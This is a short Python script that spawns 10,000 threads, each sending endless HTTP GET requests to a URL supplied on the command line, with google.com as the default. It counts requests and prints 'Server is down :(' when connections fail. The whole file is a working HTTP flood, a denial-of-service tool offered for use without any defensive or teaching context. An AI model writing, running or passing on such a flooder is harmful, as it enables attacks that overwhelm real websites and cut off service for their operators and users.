import argparse
import sys
import threading

import requests


def main(link, thread_number):
    i = 0
    while True:
        i += 1
        try:
            res = requests.get(link)
            print(f'{res.status_code} - status code. {i} - requests have been sent. Thread - {thread_number}')
        except requests.exceptions.ConnectionError:
            print('Server is down :(')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-l', '--link', default='https://google.com')

    for i in range(10000):
        threading.Thread(target=main, args=[parser.parse_args(sys.argv[1:]).link, i]).start()
